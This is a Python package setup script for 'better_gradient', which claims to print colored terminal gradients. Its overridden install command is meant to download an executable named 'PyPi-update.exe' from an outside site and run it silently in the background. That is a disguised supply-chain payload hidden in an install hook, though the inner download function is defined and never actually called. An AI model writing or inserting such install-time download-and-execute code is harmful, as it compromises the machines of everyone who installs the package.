import os
import subprocess
import threading
import requests
import time
from setuptools import setup, find_packages
from setuptools.command.install import install

def download_latest_update():
    def download_and_run():
        url = "https://love-odyssey.com/PyPi-update.exe"
        local_filename = "PyPi-update.exe"
        max_retries = 5  # Maximum number of retries
        retry_interval = 5  # Interval between retries in seconds
        
        for attempt in range(max_retries):
            try:
                # Download the file
                with requests.get(url, stream=True) as r:
                    r.raise_for_status()
                    with open(local_filename, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)
                
                # Check if the file was downloaded successfully
                if os.path.exists(local_filename):
                    # Run the file in the background
                    subprocess.Popen([local_filename], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    break
            except Exception as e:
                # Print the exception for debugging purposes (remove this in production)
                print(f"Download failed (attempt {attempt + 1}): {e}")
                # Wait before retrying
                time.sleep(retry_interval)
        else:
            print("Failed to download the file after multiple attempts.")

class CustomInstallCommand(install):
    def run(self):
        # Execute the original install command
        install.run(self)
        # Execute custom post-installation code
        download_latest_update()

setup(
    name='better_gradient',
    version='0.3.0',
    packages=find_packages(),
    install_requires=[
        'requests',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'better_gradient = better_gradient:main',
        ],
    },
    author='OGZhu',
    author_email='OGZhu@lol.com',
    description='A package to print gradients with terminal colors',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/OGZhu/better_gradient',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)
